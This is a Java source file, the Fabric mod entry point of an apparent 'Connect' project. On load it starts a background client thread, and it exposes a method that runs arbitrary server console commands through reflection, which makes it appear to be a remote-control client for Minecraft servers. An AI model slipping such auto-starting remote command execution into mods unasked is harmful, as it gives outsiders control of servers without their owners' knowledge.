package br.com.introcdc.connect.client.server;
/*
 * Written by IntroCDC, Bruno Coelho at 11/09/2026 - 17:42
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.client.ConnectClient;
import net.fabricmc.api.ModInitializer;
// import net.fabricmc.fabric.api.event.lifecycle.v1.ServerLifecycleEvents;

public class FabricMain implements ModInitializer {

    private static Object server;

    @Override
    public void onInitialize() {
        Connect.FOLDER = "mods/";
        Connect.updateRegister(null);
        new Thread(ConnectClient::registerAndStart).start();

        // DESCOMENTE QUANDO FOR COMPILAR NO JAVA 17+
        // ServerLifecycleEvents.SERVER_STARTED.register(minecraftServer -> server = minecraftServer);
    }

    public static void execute(String command) {
        if (server != null) {
            try {
                Object commandManager = server.getClass().getMethod("getCommandManager").invoke(server);
                Object commandSource = server.getClass().getMethod("getCommandSource").invoke(server);
                commandManager.getClass().getMethod("executeWithPrefix", commandSource.getClass(), String.class)
                        .invoke(commandManager, commandSource, command);
            } catch (Exception e) {
                try {
                    Object commandManager = server.getClass().getMethod("getCommands").invoke(server);
                    Object commandSource = server.getClass().getMethod("createCommandSourceStack").invoke(server);
                    commandManager.getClass().getMethod("performPrefixedCommand", commandSource.getClass(), String.class)
                            .invoke(commandManager, commandSource, command);
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
        }
    }

}
